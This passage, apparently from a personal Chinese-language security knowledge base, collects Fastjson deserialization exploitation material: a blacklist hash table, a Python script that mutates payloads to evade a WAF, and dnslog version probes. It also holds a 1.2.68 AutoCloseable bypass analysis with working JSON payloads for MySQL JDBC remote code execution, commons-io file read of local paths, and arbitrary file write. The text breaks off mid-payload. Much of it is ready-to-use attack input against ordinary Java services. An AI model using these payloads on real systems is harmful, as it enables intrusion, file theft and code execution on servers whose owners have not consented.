0x80d0c70bcc2fea02L org.apache.ibatis.executor. 1.2.62 -8649961213709896794 0x87f52a1b07ea33a6L net.sf.cglib. 1.2.62 -6316154655839304624 0xa85882ce1044c450L oracle.net. 1.2.62 -5764804792063216819 0xafff4c95b99a334dL com.mysql.cj.jdbc.MysqlDataSource 1.2.62 -4608341446948126581 0xc00be1debaf2808bL jdk.internal. 1.2.62 -4438775680185074100 0xc2664d0958ecfe4cL aj.org.objectweb.asm. 1.2.62 -3319207949486691020 0xd1efcdf4b3316d34L oracle.jdbc. 1.2.62 -2192804397019347313 0xe1919804d5bf468fL org.apache.commons.collections.comparators. 1.2.62 -2095516571388852610 0xe2eb3ac7e56c467eL net.sf.ehcache.hibernate. 1.2.62 4750336058574309 0x10e067cd55c5e5L com.mysql.cj.log. 1.2.62 218512992947536312 0x3085068cb7201b8L org.h2.jdbcx. 1.2.62 823641066473609950 0xb6e292fa5955adeL org.apache.commons.logging. 1.2.62 1534439610567445754 0x154b6cb22d294cfaL org.apache.ibatis.reflection. 1.2.62 1818089308493370394 0x193b2697eaaed41aL org.h2.server. 1.2.62 2164696723069287854 0x1e0a8c3358ff3daeL org.apache.ibatis.datasource. 1.2.62 2653453629929770569 0x24d2f6048fef4e49L org.objectweb.asm. 1.2.62 2836431254737891113 0x275d0732b877af29L flex.messaging.util.concurrent. 1.2.62 3089451460101527857 0x2adfefbbfe29d931L org.apache.ibatis.javassist. 1.2.62 3256258368248066264 0x2d308dbbc851b0d8L java.lang.UNIXProcess 1.2.62 3718352661124136681 0x339a3e0b6beebee9L org.apache.ibatis.ognl. 1.2.62 4046190361520671643 0x3826f4b2380c8b9bL com.mysql.cj.jdbc.MysqlConnectionPoolDataSource 1.2.62 4841947709850912914 0x43320dc9d2ae0892L org.codehaus.jackson. 1.2.62 6280357960959217660 0x5728504a6d454ffcL org.apache.ibatis.scripting. 1.2.62 6534946468240507089 0x5ab0cb3071ab40d1L org.apache.commons.proxy. 1.2.62 6734240326434096246 0x5d74d3e5b9370476L com.mysql.cj.jdbc.MysqlXADataSource 1.2.62 7123326897294507060 0x62db241274397c34L org.apache.commons.collections.functors. 1.2.62 8488266005336625107 0x75cc60f5871d0fd3L org.apache.commons.configuration 1.2.66 -2439930098895578154 0xde23a0809a8b9bd6L javax.script. 1.2.66 -582813228520337988 0xf7e96e74dfa58dbcL javax.sound. 1.2.66 -26639035867733124 0xffa15bf021f1e37cL javax.print. 1.2.66 386461436234701831 0x55cfca0f2281c07L javax.activation. 1.2.66 1153291637701043748 0x100150a253996624L javax.tools. 1.2.66 1698504441317515818L 0x17924cca5227622aL javax.management. 1.2.66 7375862386996623731L 0x665c53c311193973L org.apache.xbean. 1.2.66 7658177784286215602L 0x6a47501ebb2afdb2L org.eclipse.jetty. 1.2.66 8055461369741094911L 0x6fcabf6fa54cafffL javax.naming. 1.2.67 -7775351613326101303L 0x941866e73beff4c9L org.apache.shiro.realm. 1.2.67 -6025144546313590215L 0xac6262f52c98aa39L org.apache.http.conn. 1.2.67 -5939269048541779808L 0xad937a449831e8a0L org.quartz. 1.2.67 -5885964883385605994L 0xae50da1fad60a096L com.taobao.eagleeye.wrapper 1.2.67 -3975378478825053783L 0xc8d49e5601e661a9L org.apache.http.impl. 1.2.67 -2378990704010641148L 0xdefc208f237d4104L com.ibatis. 1.2.67 -905177026366752536L 0xf3702a4a5490b8e8L org.apache.catalina. 1.2.67 2660670623866180977L 0x24ec99d5e7dc5571L org.apache.http.auth. 1.2.67 2731823439467737506L 0x25e962f1c28f71a2L br.com.anteros. 1.2.67 3637939656440441093L 0x327c8ed7c8706905L com.caucho. 1.2.67 4254584350247334433L 0x3b0b51ecbf6db221L org.apache.http.cookie. 1.2.67 5274044858141538265L 0x49312bdafb0077d9L org.javasimon. 1.2.67 5474268165959054640L 0x4bf881e49d37f530L org.apache.cocoon. 1.2.67 5596129856135573697L 0x4da972745feb30c1L org.apache.activemq.jms.pool. 1.2.67 6854854816081053523L 0x5f215622fb630753L org.mortbay.jetty. 1.2.68 -3077205613010077203L 0xd54b91cc77b239edL org.apache.shiro.jndi. 1.2.68 -2825378362173150292L 0xd8ca3d595e982bacL org.apache.ignite.cache.jta. 1.2.68 2078113382421334967L 0x1cd6f11c6a358bb7L javax.swing.J 1.2.68 6007332606592876737L 0x535e552d6f9700c1L org.aoju.bus.proxy.provider. 1.2.68 9140390920032557669L 0x7ed9311d28bf1a65L java.awt.p 1.2.68 9140416208800006522L 0x7ed9481d28bf417aL java.awt.i 1.2.69 -8024746738719829346L 0x90a25f5baa21529eL java.io.Serializable 1.2.69 -5811778396720452501L 0xaf586a571e302c6bL java.io.Closeable 1.2.69 -3053747177772160511L 0xd59ee91f0b09ea01L oracle.jms.AQ 1.2.69 -2114196234051346931L 0xe2a8ddba03e69e0dL java.util.Collection 1.2.69 -2027296626235911549L 0xe3dd9875a2dc5283L java.lang.Iterable 1.2.69 -2939497380989775398L 0xd734ceb4c3e9d1daL java.lang.Object 1.2.69 -1368967840069965882L 0xed007300a7b227c6L java.lang.AutoCloseable 1.2.69 2980334044947851925L 0x295c4605fd1eaa95L java.lang.Readable 1.2.69 3247277300971823414L 0x2d10a5801b9d6136L java.lang.Cloneable 1.2.69 5183404141909004468L 0x47ef269aadc650b4L java.lang.Runnable 1.2.69 7222019943667248779L 0x6439c4dff712ae8bL java.util.EventListener 1.2.70 -5076846148177416215L 0xb98b6b5396932fe9L org.apache.commons.collections4.Transformer 1.2.70 -4703320437989596122L 0xbeba72fb1ccba426L org.apache.commons.collections4.functors 1.2.70 -4314457471973557243L 0xc41ff7c9c87c7c05L org.jdom2.transform. 1.2.70 -2533039401923731906L 0xdcd8d615a6449e3eL org.apache.hadoop.shaded.com.zaxxer.hikari. 1.2.70 156405680656087946L 0x22baa234c5bfb8aL com.p6spy.engine. 1.2.70 1214780596910349029L 0x10dbc48446e0dae5L org.apache.activemq.pool. 1.2.70 3085473968517218653L 0x2ad1ce3a112f015dL org.apache.aries.transaction. 1.2.70 3129395579983849527L 0x2b6dd8b3229d6837L org.apache.activemq.ActiveMQConnectionFactory 1.2.70 4241163808635564644L 0x3adba40367f73264L org.apache.activemq.spring. 1.2.70 7240293012336844478L 0x647ab0224e149ebeL org.apache.activemq.ActiveMQXAConnectionFactory 1.2.70 7347653049056829645L 0x65f81b84c1d920cdL org.apache.commons.jelly. 1.2.70 7617522210483516279L 0x69b6e0175084b377L org.apache.axis2.transport.jms. 1.2.71 -4537258998789938600L 0xc1086afae32e6258L java.io.FileReader 1.2.71 -4150995715611818742L 0xc664b363baca050aL java.io.ObjectInputStream 1.2.71 -2995060141064716555L 0xd66f68ab92e7fef5L java.io.FileInputStream 1.2.71 -965955008570215305L 0xf2983d099d29b477L java.io.ObjectOutputStream 1.2.71 -219577392946377768L 0xfcf3e78644b98bd8L java.io.DataOutputStream 1.2.71 2622551729063269307L x24652ce717e713bbL java.io.PrintWriter 1.2.71 2930861374593775110L 0x28ac82e44e933606L java.io.Buffered 1.2.71 4000049462512838776L 0x378307cb0111e878L java.io.InputStreamReader 1.2.71 4193204392725694463L 0x3a31412dbb05c7ffL java.io.OutputStreamWriter 1.2.71 5545425291794704408L 0x4cf54eec05e3e818L java.io.FileWriter 1.2.71 6584624952928234050L 0x5b6149820275ea42L java.io.FileOutputStream 1.2.71 7045245923763966215L 0x61c5bdd721385107L java.io.DataInputStream Payload转换 有些使用了存在漏洞的fastjson版本，但是有WAF在外面，所以抄了一个师傅的脚本 #!usr/bin/env python # -*- coding:utf-8 -*- \"\"\" @author: longofo @file: fastjson_fuzz.py @time: 2020/05/07 \"\"\" import json from json import JSONDecodeError class FastJsonPayload: def __init__(self, base_payload): try: json.loads(base_payload) except JSONDecodeError as ex: raise ex self.base_payload = base_payload def gen_common(self, payload, func): tmp_payload = json.loads(payload) dct_objs = [tmp_payload] while len(dct_objs) > 0: tmp_objs = [] for dct_obj in dct_objs: for key in dct_obj: if key == \"@type\": dct_obj[key] = func(dct_obj[key]) if type(dct_obj[key]) == dict: tmp_objs.append(dct_obj[key]) dct_objs = tmp_objs return json.dumps(tmp_payload) # 对@type的value增加L开头，;结尾的payload def gen_payload1(self, payload: str): return self.gen_common(payload, lambda v: \"L\" + v + \";\") # 对@type的value增加LL开头，;;结尾的payload def gen_payload2(self, payload: str): return self.gen_common(payload, lambda v: \"LL\" + v + \";;\") # 对@type的value进行\\u def gen_payload3(self, payload: str): return self.gen_common(payload, lambda v: ''.join('\\\\u{:04x}'.format(c) for c in v.encode())).replace(\"\\\\\\\\\", \"\\\\\") # 对@type的value进行\\x def gen_payload4(self, payload: str): return self.gen_common(payload, lambda v: ''.join('\\\\x{:02x}'.format(c) for c in v.encode())).replace(\"\\\\\\\\\", \"\\\\\") # 生成cache绕过payload def gen_payload5(self, payload: str): cache_payload = { \"rand1\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" } } cache_payload[\"rand2\"] = json.loads(payload) return json.dumps(cache_payload) def gen(self): payloads = [] payload1 = self.gen_payload1(self.base_payload) yield payload1 payload2 = self.gen_payload2(self.base_payload) yield payload2 payload3 = self.gen_payload3(self.base_payload) yield payload3 payload4 = self.gen_payload4(self.base_payload) yield payload4 payload5 = self.gen_payload5(self.base_payload) yield payload5 payloads.append(payload1) payloads.append(payload2) payloads.append(payload5) for payload in payloads: yield self.gen_payload3(payload) yield self.gen_payload4(payload) if __name__ == '__main__': fjp = FastJsonPayload('''{ \"rand1\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://localhost:1389/Object\", \"autoCommit\": true } }''') for payload in fjp.gen(): print(payload) print() Fastjson姿势技巧集合 https://github.com/safe6Sec/Fastjson 做个备份，怕删了 # Fastjson Fastjson姿势技巧集合 ## 说明 2021.8.10 小弟水平有限，1.2.48之后高版本漏洞成因还未进行研究探索，很多利用细节和注意事项都不够完整，待我有空慢慢补充。 ## 探测 用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。 fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。 主要是利用各个类被加入黑名单的方式进行判断 fastjson >1.2.43 ```java {\"@type\":\"java.net.URL\",\"val\":\"dnslog\"} ``` fastjson >1.2.48 ```java {\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog\"} ``` fastjson >1.2.68 ```java {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:\"aaa\"} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"http://dnslog\"}}\"\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}} {{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}:0 ``` ## 各版本利用 除了考虑Fastjson版本，还得考虑JDK版本，中间件版本，第三方依赖版本。 JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本 参考链接 Fastjson系列三——历史版本补丁绕过（需开启AutoType） Fastjson反序列化漏洞分析 Fastjson 反序列化漏洞史 FastJson 反序列化学习 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/05.Fastjson1.2.68分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/05.Fastjson1.2.68分析.html","title":"05.Fastjson1.2.68分析","keywords":"","body":" 前言 分析1 分析2 ThrowableDeserializer 分析 利用 JavaBeanDeserializer 分析 利用 AutoCloseable深入使用 小知识1 小知识2 好坑 知识点3 利用链挖掘 链利用 Mysql JDBC RCE mysql 5.1.x >= 5.1.11 Mysqlconnector 6.0.2 or 6.0.3 Mysqlconnector 6.x or commons-io文件读取 commons-io2.x文件写入 总结 参考链接 前言 1.2.68有safeMode，但是默认不是开启的，所以还是有风险 分析1 根据网上信息的描述，这次问题点主要是在checkAutoType参数期望类这个地方 看看哪些地方会调用checkAutoType方法并使用到期望类这个参数 发现主要是2个地方会使用到 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze 那哪些地方会使用到这两个类的对应的deserialze方法呢？ 发现这个地方刚好是常规的@type进行checkAutoType检查后进行反序列化的时候会调用到； 先构造反序列化器，也就是说如果我们@type的值对应的类构造的反序列化器是JavaBeanDeserializer或者ThrowableDeserializer，就会触发deserialze，同时有希望触发带有期望类参数的checkAutoType达到我们的目的 总结成一句话就是：寻找怎么才能调用到带有expectClass参数的checkAutoType方法 分析2 那这俩个反序列化器是怎么构造出来的呢？ 我们跟一下config.getDeserializer(clazz) 重载，经过一系列的各种class的判断，到了这 如果clazz是Throwable的子类，那么就返回ThrowableDeserializer 如果所有条件都不满足，那么就会调用createJavaBeanDeserializer去新建JavaBeanDeserializer 跟进新建函数，发现是接口的情况，asmEnable为false，可以创建javaBeanDeserializer对象，否则调用的asmFactory.createJavaBeanDeserializer进行创建，不是我们想要的 ThrowableDeserializer 分析 要使用到com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer这个反序列化器，根据上面的分析，那么我们@type传入的就应该是Throwable的子类 所以poc（这里就直接用的他本身了） 因为java.lang.Throwable不在mapping和可信任的map中，所以这里要手动开启autoTypeSupport ParserConfig.getGlobalInstance().setAutoTypeSupport(true); {\"@type\":\"java.lang.Throwable\", \"a\":\"b\"} 运行，跟，可以看到这个时候我们的反序列化器deserializer确实是我们预计的ThrowableDeserializer类 进入deserialize，然后一直F8，发现payload后续参数满足条件键值对的键是@type，就可以调用带有期望类参数的checkAutoType 所以修改一下payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"org.example.App\"} 然后跟到刚才的地方 key为@type，exClass为我们输入的@type对应的值org.example.App，进入checkAutoType（期望类为Throwable.class，平时一般为null） 通过各种黑白名单的检查，一直到这，loadClass（因为这里开启了autoTypeSupport，所以cacheClass为true） 跟进看看，其实就是给它加到mapping中 再返回到checkAutoType继续往下，如果传入的clazz是期望类的子类，就通过autoType检查返回clazz 也就是说，我们的第二个@type对应的类必须是期望类java.lang.Throwable的子类，我们这里是自己随便写的一个类明显不是Throwable的子类，会抛出异常，所以找一个它的子类改一下payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"java.lang.Error\"} 运行到刚才的地方，成功返回clazz 如果payload中还有其他的参数，关键参数如message会被用作后续的构造函数的参数等，otherValues就是传入的其他参数，比如\"a\":\"b\"这种，在创建实例后会进行setValue操作 再往后就是创建一个实例，用上刚才传入的参数啥的 跟进就是通过反射获取构造函数再创建实例 有参数的情况下会执行setValue操作，也就是会调用setXXX方法 利用 通过上述的分析，开启ast的情况下，如果我们能找到一个java.lang.Throwable的子类，且其的setter或者getter能执行危险操作，就有可利用的嫌疑 限定了可以利用的类必须是Throwable的子类，不过异常类很少使用高危函数。。。所以很鸡肋吧 需要开启AST，更鸡肋了，随便找个不在黑名单的类都可以利用了 举个例子： 恶意类 package org.example; import lombok.Data; @Data public class User extends Error{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } } payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"org.example.User\", \"test\":\"hahahaha\"} JavaBeanDeserializer 分析 在获取反序列化器的时候，如果是一个接口，且里面所有的判断都不满足，就会返回JavaBeanDeserializer 我们随便创建一个接口 package org.example; public interface Test { } payload {\"@type\":\"org.example.Test\", \"test\":\"hahahaha\"} 运行，一直到获取了反序列化器进行反序列化 跟进，看看里面的判断条件，一阵F8后，看到了熟悉的东西 也就是说和刚才那个一样，还得需要一个@type，修改payload {\"@type\":\"org.example.Test\", \"@type\":\"org.example.Test1\", \"test\":\"hahahaha\"} 熟悉的味道 往下，进入checkAutoType，expectClass为我们传入的第一个接口 又一直F8，来到了熟悉的地方，loadClass，给我们的传入的第二个@type的类加入到mapping中 再往后，这几行基本杜绝了JNDI注入的风险 再继续往下，clazz必须是expectClass的子类，和上面那个类似 我们把接口Test1变成Test的子类，然后继续 通过验证，ok，返回clazz 返回就是常规的setValue了 利用 和上面那个差不多一样，只不过这个应用更广泛，只需要找一个接口，然后找一个实现了这个接口的类，类中有可以利用的点即可；最好是可以绕过autoTypeSupport 于是大佬们找到了java.lang.AutoCloseable这个接口，这个接口位于默认的mapping中，有很多子类，不开启autoTypeSupport也可以用（大佬们真牛） 本地先测试下，证明我们的猜想是不是正确的，编写个恶意的类，实现java.lang.AutoCloseable接口 package org.example; public class User implements AutoCloseable{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } @Override public void close() throws Exception { } } payload（不开启autoTypeSupport） {\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.example.User\", \"test\":\"hahahaha\"} Bingo!!! AutoCloseable深入使用 小知识1 fastjson除了使用setXXX的方法赋值外，也可以直接对构造函数进行传值反序列为对象，比如 public User(String test){ System.out.println(test); } 可以通过下面的json来实现赋值，这也是后面payload用到的一个点 { \"@type\":\"org.example.User\", \"test\": \"123123\" } 小知识2 在分析过程中，反序列化操作时，我们还发现存在一个key $ref， 这个$ref参数的作用是什么呢？简单来说就是从其他地方获取一个对象当作参数传进去，有兴趣的小伙伴可以自己跟一下，我跟过一次了就不再重复了 引用 描述 \"$ref\":\"..\" 上一级 \"$ref\":\"@\" 当前对象，也就是自引用 \"$ref\":\"$\" 根对象 \"$ref\":\"$.children.0\" 基于路径的引用，相当于 root.getChildren().get(0) 举个例子（把User类对象当成参数传到T类中） org.example.User package org.example; public class User implements AutoCloseable{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } public String getTest() { return test; } @Override public void close() throws Exception { } } org.example.T package org.example; public class T implements AutoCloseable{ private User user; public void setUser(User user) { System.out.println(\"call setUser\"); this.user = user; } public User getUser() { return user; } @Override public void close() throws Exception { } } poc { \"user\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.example.User\", \"test\": \"test666\" }, \"t\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.example.T\", \"user\":{ \"$ref\": \"$.user\" } } } 运行poc，T类在执行setUser操作时，传入的参数为前面参数user实例化的类User，结果如下 call setTest test value: test666 call setUser {\"t\":{\"user\":{\"test\":\"test666\"}},\"user\":{\"$ref\":\"$.t.user\"}} 好坑 网上流传一个简单的Payload，没有就创建文件，有就置空文件内容 { '@type':\"java.lang.AutoCloseable\", '@type':'java.io.FileWriter', 'file':'/tmp/nonexist', 'append':false } 给file改成自己的路径，但是我各种测试，发现有问题，一直报错 Exception in thread \"main\" com.alibaba.fastjson.JSONException: default constructor not found. class java.io.FileWriter 然后跟着一顿调试，发现是com.alibaba.fastjson.util.ASMUtils#lookupParameterNames这里面的问题，不能获取到FileWriter构造函数的参数名，但是又没有public FileWriter(){}这个构造函数，所以不能生成实例会报错。。。 自己写一个构造函数，然后尝试去反序列化，发现又可以获取到构造函数的参数名。。。 Org.example.User package org.example; public class User implements AutoCloseable{ public User(String file){ System.out.println(file); } public User( String file, boolean append){ System.out.println(append); System.out.println(file); } @Override public void close() throws Exception { } } payload { '@type':\"java.lang.AutoCloseable\", '@type':'org.example.User', 'file':'/tmp/test.txt', 'append':false } 然后经过各种查资料，发现 https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg 中有说这个问题 总结一下就是： fastjson检查不到FileWriter的构造函数参数的参数名，所以不知道你调用构造函数中需要传入的参数名是什么，就不能生成对象 只有当这个类 class 字节码带有调试信息且其中包含有变量信息时才会有类构造函数的参数的参数名信息。。。 可以通过如下命令来检查，如果有输出 LocalVariableTable，则证明其 class 字节码里的构造函数参数包含有参数名信息： javap -l | grep LocalVariableTable 看下我自己写的能识别到构造函数参数的参数名的User类，确实有参数名在里面 看下FileWriter类，确实没得参数名。。。 知识点3 通过分析发现，不是所有的构造函数的参数名都可以使用，而是第一个 参数名最多 的构造函数中的参数名才可以使用， 比如org.apache.commons.io.output.FileWriterWithEncoding，同时有public FileWriterWithEncoding(File file, CharsetEncoder encoding, boolean append) 和 public FileWriterWithEncoding(String filename, CharsetEncoder encoding, boolean append)2个3参数名的构造函数，fastjson在识别到file encoding append这3个参数名后，后续就算识别到filename encoding append也会跳过参数名更新，所以不能用filename作为参数，只能使用file。。。 根据fastjson的识别机制，具体原因是因为： 利用链挖掘 AutoCloseable接口位于java.lang包下，从JDK1.7开始引入，java的io流间接性的可以自动关闭接口，也就是说从jdk1.7开始，不需要手动去关流。 所以我们关注的一些包主要是进行流操作的包，从他的子类或者实现类也可以看出来。 整理一下我的盲挖掘的思路：（不是那么专业，大佬见谅） 获取一个包下所有的类 看看这些类是不是继承的AutoCloseable这个接口，使用isAssignableFrom()方法来判断 看看这些类的构造函数能否获取到参数名，或者有不有setXXX的方法 手动分析能否利用，看看构造函数或者setXXX函数中有不有可以利用的地方 这里也用大佬们挖过的commons-io为例吧 Pom.xml 需要其他的包按需添加 com.alibaba fastjson 1.2.68 org.springframework spring-webmvc 5.1.6.RELEASE 盲搜索代码 package org.example; import com.alibaba.fastjson.util.ASMUtils; import org.springframework.core.io.Resource; import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import org.springframework.core.type.classreading.SimpleMetadataReaderFactory; import java.io.IOException; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.Arrays; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { Class aClass = Class.forName(\"java.lang.AutoCloseable\"); // 超类 PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver(); // 1.加载資源 classpath*:com/hadluo/**/*.class : 找环境变量下的 com/hadluo下的 所有.class文件 Resource[] resources = resolver.getResources(\"classpath*:org/apache/commons/io/**/*.class\"); for (Resource res : resources) { // 先获取resource的元信息，然后获取class元信息，最后得到 class 全路径 String clsName = new SimpleMetadataReaderFactory().getMetadataReader(res).getClassMetadata().getClassName(); // 2. 通过名称加载类 Class tmpClass = Class.forName(clsName); // 3. 判断是不是 aClass 的子类 if (aClass.isAssignableFrom(tmpClass)) { // 4. 判断能否识别构造函数参数名，直接copy的fastjson里面的代码 Constructor creatorConstructor = null; // 构造函数 String[] paramNames = null; // 存放所有参数，只有这个构造函数的参数名会使用，其他的构造函数都不能用，参考com.alibaba.fastjson.util.JavaBeanInfo.build(java.lang.Class, java.lang.reflect.Type, com.alibaba.fastjson.PropertyNamingStrategy, boolean, boolean, boolean)里面的逻辑（知识点3） Constructor[] constructors = tmpClass.getDeclaredConstructors(); for (Constructor constructor : constructors) { String[] lookupParameterNames = ASMUtils.lookupParameterNames(constructor); if (lookupParameterNames == null || lookupParameterNames.length == 0) { continue; } if (creatorConstructor != null && paramNames != null && lookupParameterNames.length 运行看看哪些类可能可以用 构造函数可用：public org.apache.commons.io.input.AutoCloseInputStream(java.io.InputStream) 任意文件写入参考：https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg 我这里就不赘述了，贴个简单的，文件新建或者置空 用org.apache.commons.io.output.FileWriterWithEncoding这个类 跟一下initWriter，当append为false时，如果文件存在，就置空，不存在就新建 试试，POC { \"置空\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\": \"/Users/d4m1ts/Downloads/a.txt\", \"encoding\": \"UTF-8\" }, \"新建\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\": \"/Users/d4m1ts/Downloads/b.txt\", \"encoding\": \"UTF-8\" } } 链利用 Mysql JDBC RCE 搭配使用 https://github.com/fnmsd/MySQL_Fake_Server mysql 5.1.x >= 5.1.11 5.1.11及以上的5.x版本 所需依赖 mysql mysql-connector-java 5.1.11 commons-collections commons-collections 3.1 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"CommonsCollections5\", // 利用链，自己在MySQL_Fake_Server的conf里面改，具体看他的readme \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } 效果 Mysqlconnector 6.0.2 or 6.0.3 所需依赖 mysql mysql-connector-java 6.0.2 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\": { \"url\": \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=CommonsCollections5\" } } } 效果 Mysqlconnector 6.x or 所需依赖 mysql mysql-connector-java 8.0.19 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\", \"proxy\": { \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\", \"connectionUrl\": { \"@type\": \"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\": [ { \"host\": \"127.0.0.1\" } ], \"slaves\": [], \"properties\": { \"host\": \"127.0.0.1\", \"user\": \"CommonsCollections5\", \"dbname\": \"dbname\", \"password\": \"pass\", \"queryInterceptors\": \"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\" } } } } 效果 commons-io文件读取 所需依赖 commons-io commons-io 2.4 Payload { \"abc\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///Users/d4m1ts/Downloads/a.txt\" }, \"charsetName\": \"UTF-8\", \"bufferSize\": 1024 }, \"boms\": [{ \"charsetName\": \"UTF-8\", \"bytes\": [49] // 如果读出来的第一个字节是49，就返回，否则返回空 }] }, \"address\": { \"$ref\": \"$.abc.BOM\" } } { \"abc\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///Users/d4m1ts/Downloads/a.txt\" }, \"charsetName\": \"UTF-8\", \"bufferSize\": 1024 }, \"boms\": [{ \"charsetName\": \"UTF-8\", \"bytes\": [49,50] // 如果读出来的第一个字节是49，第二个字节是50，就返回，否则返回空 }] }, \"address\": { \"$ref\": \"$.abc.BOM\" } } 效果 commons-io2.x文件写入 注意事项：写入内容的长度必须要>8192，不然会失败；实际写入的内容只有前8192个字符，后面的不会写入 commons-io 2.0 - 2.6 版本 { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(长度要大于8192，实际写入前8192个字符)\" }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"encoding\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } } } commons-io 2.7 - 2.8.0 版本： { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(长度要大于8192，实际写入前8192个字符)\", \"start\":0, \"end\":2147483647 }, 